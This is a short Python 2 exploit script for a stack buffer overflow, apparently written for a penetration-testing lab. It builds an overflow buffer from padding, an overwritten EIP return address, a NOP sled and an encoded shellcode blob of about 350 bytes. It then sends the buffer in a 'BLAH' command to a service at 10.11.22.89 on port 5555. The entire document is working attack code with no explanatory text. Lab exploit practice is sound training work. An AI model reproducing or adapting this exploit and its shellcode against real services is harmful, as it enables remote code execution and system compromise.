#!/usr/bin/python
import socket

offset   = "A"*1040
eip      = "\x71\x1D\xD1\x65"
extranop = "\x90"*16 #extra space for shellcode decoding
padding  = "C"*(1450-1040-4-16-351) # total size off data send - variables 


shellcode = (
"\xd9\xe5\xbe\x18\x4c\xaf\xfc\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x70\x17\x83\xe8\xfc\x03\x68\x5f\x4d\x09\x74\xb7\x13"
"\xf2\x84\x48\x74\x7a\x61\x79\xb4\x18\xe2\x2a\x04\x6a\xa6\xc6"
"\xef\x3e\x52\x5c\x9d\x96\x55\xd5\x28\xc1\x58\xe6\x01\x31\xfb"
"\x64\x58\x66\xdb\x55\x93\x7b\x1a\x91\xce\x76\x4e\x4a\x84\x25"
"\x7e\xff\xd0\xf5\xf5\xb3\xf5\x7d\xea\x04\xf7\xac\xbd\x1f\xae"
"\x6e\x3c\xf3\xda\x26\x26\x10\xe6\xf1\xdd\xe2\x9c\x03\x37\x3b"
"\x5c\xaf\x76\xf3\xaf\xb1\xbf\x34\x50\xc4\xc9\x46\xed\xdf\x0e"
"\x34\x29\x55\x94\x9e\xba\xcd\x70\x1e\x6e\x8b\xf3\x2c\xdb\xdf"
"\x5b\x31\xda\x0c\xd0\x4d\x57\xb3\x36\xc4\x23\x90\x92\x8c\xf0"
"\xb9\x83\x68\x56\xc5\xd3\xd2\x07\x63\x98\xff\x5c\x1e\xc3\x97"
"\x91\x13\xfb\x67\xbe\x24\x88\x55\x61\x9f\x06\xd6\xea\x39\xd1"
"\x19\xc1\xfe\x4d\xe4\xea\xfe\x44\x23\xbe\xae\xfe\x82\xbf\x24"
"\xfe\x2b\x6a\xea\xae\x83\xc5\x4b\x1e\x64\xb6\x23\x74\x6b\xe9"
"\x54\x77\xa1\x82\xff\x82\x22\xa7\xf4\x8c\xf7\xdf\x08\x8c\xe6"
"\x43\x84\x6a\x62\x6c\xc0\x25\x1b\x15\x49\xbd\xba\xda\x47\xb8"
"\xfd\x51\x64\x3d\xb3\x91\x01\x2d\x24\x52\x5c\x0f\xe3\x6d\x4a"
"\x27\x6f\xff\x11\xb7\xe6\x1c\x8e\xe0\xaf\xd3\xc7\x64\x42\x4d"
"\x7e\x9a\x9f\x0b\xb9\x1e\x44\xe8\x44\x9f\x09\x54\x63\x8f\xd7"
"\x55\x2f\xfb\x87\x03\xf9\x55\x6e\xfa\x4b\x0f\x38\x51\x02\xc7"
"\xbd\x99\x95\x91\xc1\xf7\x63\x7d\x73\xae\x35\x82\xbc\x26\xb2"
"\xfb\xa0\xd6\x3d\xd6\x60\xf6\xdf\xf2\x9c\x9f\x79\x97\x1c\xc2"
"\x79\x42\x62\xfb\xf9\x66\x1b\xf8\xe2\x03\x1e\x44\xa5\xf8\x52"
"\xd5\x40\xfe\xc1\xd6\x40")

buffer = offset + eip + extranop + shellcode + padding  #A=Offset B=EIP BADCHARSstring Dump memmory of ESP after crash C=Sie buffer






s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.11.22.89',5555))
s.recv(1024)
s.send('BLAH ' + buffer + '\r\n')
s.send('QUIT\r\n')
print s.recv(1024)
s.close()
